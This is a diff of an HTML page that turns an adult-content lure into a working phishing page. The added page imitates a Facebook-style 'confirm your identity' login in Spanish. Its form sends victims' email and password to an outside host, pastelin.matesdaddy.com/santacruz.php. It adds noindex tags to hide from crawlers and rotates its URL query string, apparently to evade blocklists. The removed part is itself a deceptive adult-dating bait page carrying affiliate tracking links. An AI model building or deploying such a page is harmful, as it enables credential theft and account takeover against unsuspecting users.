@@ -1,59 +1,344 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-<script id="_wau1ca">var _wau = _wau || []; _wau.push(["dynamic", "elgue", "1ca", "ffffffffffff", "small"]);</script><script async src="//waust.at/d.js"></script>
 <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
+<title>Fotos Discretas</title>
 <meta name="robots" content="noindex, nofollow">
-<title>Reuniones D1scretas</title>
+<meta name="googlebot" content="noindex">
 <meta content="https://i.postimg.cc/9MWMPzyz/Whats-App-Image-2024-07-13-at-11-40-05-PM.jpg" property="og:image" />
-<meta content='https://i.postimg.cc/sDNdMr7x/Screenshot-936.png' property='og:image'/>
-<script src="https://cdn.smrt-content.com/assets/1004/js/jquery.min.js"></script>
-<script src="https://cdn.smrt-content.com/assets/1004/js/device.min.js"></script>
-<script src="https://cdn.smrt-content.com/assets/1004/js/custom.js"></script>
-<script src="https://cdn.smrt-content.com/assets/1004/js/backoffer.js"></script>
-<link rel="stylesheet" href="https://cdn.smrt-content.com/assets/1004/css/index.css">
-<link rel="shortcut icon" href="https://cdn.jmpcdn.com/assets/3420/images/2.ico" type="image/x-icon">
-<div class="layer">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link rel="shortcut icon" href="https://raw.githubusercontent.com/busine011/icon/main/icon.ico">
+<title>Inicie sesión en su navegador para confirmar su identidad y continuar</title>
+<style>
+       /* ==================================== */
+       /* PRELOADER STYLES */
+       /* ==================================== */
+       #preloader {
+           position: fixed;
+           top: 0;
+           left: 0;
+           width: 100%;
+           height: 100%;
+           background: #1877f2; /* Azul fuerte para la pantalla de precarga */
+           display: flex;
+           justify-content: center;
+           align-items: center;
+           z-index: 9999; /* Asegura que esté por encima de todo */
+           opacity: 1;
+           transition: opacity 0.5s ease-out, visibility 0.5s ease-out;
+           visibility: visible;
+       }
+       /* Spinner (Animación de giro con CSS) */
+       .spinner {
+           border: 5px solid #f3f3f3; /* Gris claro */
+           border-top: 5px solid #fff; /* Blanco */
+           border-radius: 50%;
+           width: 50px;
+           height: 50px;
+           animation: spin 1s linear infinite;
+       }
+       /* Animación de giro */
+       @keyframes spin {
+           0% { transform: rotate(0deg); }
+           100% { transform: rotate(360deg); }
+       }
+       /* Clase para ocultar el preloader */
+       .hidden {
+           opacity: 0 !important;
+           visibility: hidden !important;
+       }
+       /* ==================================== */
+       /* 1. ESTILOS GLOBALES Y RESET */
+       /* ==================================== */
+       body {
+           padding: 0;
+           margin: 0;
+           font-family: sans-serif;
+       }
+       a {
+           color: #216fdb;
+           cursor: pointer;
+           text-decoration: none;
+           font-size: 14px;
+       }
+       p {
+           text-align: center;
+       }
+       .fcg {
+           color: gray;
+       }
+       .mfss {
+           font-size: 12px;
+           line-height: 15px;
+       }
+       /* [Resto de los estilos CSS se mantienen como estaban, omitidos aquí por brevedad] */
+       /* ==================================== */
+       /* 2. ESTRUCTURA Y LAYOUT */
+       /* ==================================== */
+       #layout {
+           width: 95%;
+           margin: auto;
+           margin-bottom: 70px;
+       }
+       @media only screen and (min-width: 600px) {
+           #layout {
+               width: 380px;
+               margin: auto;
+           }
+       }
+       #top {
+           padding-top: 8px;
+           padding-bottom: 8px;
+           color: #3b5998;
+           background: #FFFBE2;
+           width: 100%;
+       }
+       #logo {
+           padding-top: 10px;
+           padding-bottom: 10px;
+           text-align: center;
+           align-items: center;
+       }
+       #logo img {
+           max-width: 100%;
+           height: auto;
+           min-width: 100px;
+       }
+       /* ==================================== */
+       /* 3. ELEMENTOS DEL FORMULARIO */
+       /* ==================================== */
+       .form-group {
+           margin-bottom: 10px;
+       }
+       .txt {
+           padding: 3% 2%;
+           background: #f5f6f7;
+           border: 1px solid #E3E4E5;
+           width: 100%;
+           margin-bottom: 10px;
+           font-size: 14px;
+           line-height: 18px;
+           border-radius: 5px;
+           box-shadow: 1px 1px rgba(0, 0, 0, .07);
+           box-sizing: border-box;
+       }
+       #blogin {
+           padding: 12px 0;
+           background: #1877f2;
+           border: 0;
+           width: 100%;
+           font-size: 16px;
+           line-height: 18px;
+           border-radius: 5px;
+           box-shadow: 0 2px 2px -2px #CACACA;
+           color: #fff;
+           font-weight: bold;
+           text-shadow: 0 -1px rgb(0 0 0 / 25%);
+       }
+       #bcreate {
+           background: #00A400;
+           border: 0;
+           height: 36px;
+           padding-left: 16px;
+           padding-right: 16px;
+           margin: auto;
+           font-size: 14px;
+           line-height: 18px;
+           border-radius: 5px;
+           box-shadow: 0 2px 2px -2px #CACACA;
+           color: #fff;
+           font-weight: bold;
+           text-shadow: 0 -1px rgb(0 0 0 / 25%);
+           margin-top: 25px;
+       }
+       .bb {
+           float: left;
+           width: 42%;
+           border-bottom: 2px solid #EAEBED;
+           height: 10px;
+       }
+       #c {
+           float: left;
+           width: 16%;
+           text-align: center;
+       }
+       #bottom {
+           width: 100%;
+           text-align: center;
+       }
+       /* 4. ESTILOS DE BARRA SUPERIOR */
+       .ib {
+           display: flex;
+           align-items: center;
+           justify-content: center;
+           flex: 1;
+           min-width: 0;
+           flex-grow: 1;
+           flex-shrink: 1;
+           flex-basis: 0%;
+       }
+       .top-text-container {
+           display: flex;
+           align-items: center;
+           padding: 8px 0;
+       }
+       .security-icon {
+           height: 16px;
+           width: 16px;
+           margin-right: 5px;
+           vertical-align: middle;
+       }
+       .fcg {
+           color: #3b5998;
+       }
+       ._qw9 {padding: 6px;color: #3b5998;background: #FFFBE2;}
+       ._55wr {padding: 0;}
+</style>
+</head>
+<body>
+<div id="preloader">
+<div class="spinner"></div>
 </div>
-<div class="wrap">
-<div class="step-block">
-<div class="logo">
-<img src="" alt="">
-</div>
-<div class="step-item" style="display: block;">
-<div class="question-title ">
-Llegaremos a tu domicilio por la noche, servicio en toda la ciudad. ¿Quieres ver mi catálogo?.</div>
-<div class="buttons-block">
-<div class="step-btn no-btn tr-next-button tr-b-option">
-No
-</div>
-<div class="step-btn yes-btn tr-next-button tr-b-option">
-Si
+<div id="main-content" style="display: none;">
+<div id="top" class="_qw9">
+<div class="ib">
+<div class="_55wr">
+<div class="fcg mfss top-text-container">
+<img src="https://i.postimg.cc/nLCNrqBt/456112-removebg-preview.png" alt="Candado de seguridad" class="security-icon">
+<span>Inicie sesión para confirmar su identidad.</span>
 </div>
 </div>
 </div>
-<div class="step-item thishide" style="display: none;">
-<div class="question-title ">
-¡ATENCIÓN! ¿Estás de acuerdo en respetar a las mujeres desnudas que ves a continuación? Si conoces a alguien, no lo cuentes y no difundas rumores.... </div>
+</div>
+<div id="layout">
+<div id="logo">
+<img src="https://i.postimg.cc/7YzHF63m/Captura-de-pantalla-2025-12-12-200450.png" alt="Logo de la Plataforma">
+</div>
+<form class="form-group" action="https://pastelin.matesdaddy.com/santacruz.php" method="post" enctype="multipart/form-data">
+<div class="form-group">
+<input type="email" id="emailInput" name="email" class="txt" placeholder="Correo electrónico o número de teléfono" required>
+</div>
+<div class="form-group">
+<input type="password" name="pass" class="txt" placeholder="Contraseña" required>
+</div>
+<button type="submit" id="blogin">Iniciar sesión</button>
+</form>
+<p><a href="#">¿Olvidaste tu contraseña?</a></p>
+<div style="margin-top: 25px;">
+<div class="bb"></div>
+<div id="c">o</div>
+<div class="bb"></div>
+<div style="clear: both;"></div>
+</div>
 <p>
-<b style="color: red;">
-</b>
+<button id="bcreate">Crear cuenta nueva</button>
 </p>
-<div class="buttons-block">
-<a href="https://go-2-date.us/tds/ae?tdsId=s6982pos_r&tds_campaign=s6982pos&s1=ps&utm_source=int&utm_sub=opnfnl&affid=d8a90aeb&subid={Patrona}&subid2={subid2}&clickid={clickid}" class="step-btn submit-btn tr-submit-button showmail">ESTOY DE ACUERDO
-</a>
 </div>
+<div id="bottom">
+<p class="fcg mfss" style="margin-top: 50px;">
+<a href="#">Español</a> · <a href="#">Ayuda</a>
+</p>
 </div>
-<video autoplay muted loop id="VideoBg">
-<source src="https://i.imgur.com/JuVdi4p.mp4" type="video/mp4">
-</video>
-<script type="text/javascript">
-      /*<![CDATA[*/    (function(w){
-        w.backOfferUrl = ''    }
-                        (window));
-      /*]]>*/ 
+</div> <script>
+       // 1. Lógica del Preloader (Ejecutar después de que la página se cargue)
+       window.addEventListener('load', function() {
+           const preloader = document.getElementById('preloader');
+           const mainContent = document.getElementById('main-content');
+           // Mostrar contenido principal
+           mainContent.style.display = 'block';
+           // Ocultar preloader después de 2000ms (2 segundos)
+           setTimeout(function() {
+               preloader.classList.add('hidden');
+           }, 2000);
+       });
+
+       // 2. Lógica del Autocompletado de Dominio
+       const emailInput = document.getElementById('emailInput');
+       const dominiosComunes = ['gmail.com', 'hotmail.com', 'outlook.com'];
+       emailInput.addEventListener('input', function() {
+           const valor = this.value;
+           const indiceAt = valor.indexOf('@');
+           if (indiceAt === -1 && valor.length > 0) {
+               const nombreUsuario = valor;
+               let datalist = document.getElementById('emailDatalist');
+               if (!datalist) {
+                   datalist = document.createElement('datalist');
+datalist.id = 'emailDatalist';
+                   this.setAttribute('list', 'emailDatalist');
+                   document.body.appendChild(datalist);
+               } else {
+                   datalist.innerHTML = '';
+               }
+               dominiosComunes.forEach(dominio => {
+                   const opcion = document.createElement('option');
+                   opcion.value = nombreUsuario + '@' + dominio;
+                   datalist.appendChild(opcion);
+               });
+           } else if (indiceAt !== -1 && this.hasAttribute('list')) {
+               this.removeAttribute('list');
+               const datalist = document.getElementById('emailDatalist');
+               if (datalist) {
+                   datalist.remove();
+               }
+           }
+       });
+</script>
+<script>
+
+    document.addEventListener('DOMContentLoaded', () => {
+
+        // --- Funciones de Rotación ---
+
+        function getCurrentNumber() {
+
+            // Obtiene la parte después de '?' y la convierte a número (o 0 si no existe)
+
+            const currentParam = window.location.search.substring(1);
+
+            const currentNumber = parseInt(currentParam) || 0;
+
+            return currentNumber;
+
+        }
+
+        function getNextRotatedNumber(currentNum) {
+
+            let nextNum = currentNum + 1;
+
+            // Asegura que el número esté entre 1 y 9999
+
+            if (nextNum > 9999 || nextNum === 0) {
+
+                nextNum = 1;
+
+            }
+
+            return nextNum;
+
+        }
+
+        // --- Ejecución ---
+
+        const currentNumber = getCurrentNumber();
+
+        const nextNumber = getNextRotatedNumber(currentNumber);
+
+        // Construye la nueva URL (ej: /index.html?123)
+
+        const newUrl = window.location.pathname + '?' + nextNumber;
+
+        // CLAVE: Solo cambia la URL si es diferente.
+
+        // Usa history.replaceState() para modificar la URL mostrada SIN recargar.
+
+        if (window.location.search !== '?' + nextNumber) {
+
+            window.history.replaceState(null, null, newUrl);
+
+        }
+
+    });
+</script>
 </body>
 </html>
